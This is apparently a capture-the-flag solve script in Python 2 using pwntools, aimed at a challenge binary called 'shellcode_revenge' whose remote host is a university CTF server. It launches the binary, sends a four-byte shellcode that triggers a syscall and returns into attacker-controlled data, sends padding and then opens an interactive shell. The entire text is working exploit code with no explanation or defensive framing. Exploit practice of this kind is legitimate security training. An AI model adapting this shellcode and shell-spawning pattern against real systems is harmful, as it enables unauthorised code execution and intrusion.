from pwn import *

host, port = "ctf.adl.csie.ncu.edu.tw", 11003
#p = remote(host, port)
p = process('./shellcode_revenge')
sleep(10)

shellcode = "\x0F\x05\x56\xC3"

print p.recv()
#print p.recv()
p.send(shellcode)
#p.send("aaaaa")
print p.recv()
p.send('aaaaaaa')
p.interactive()


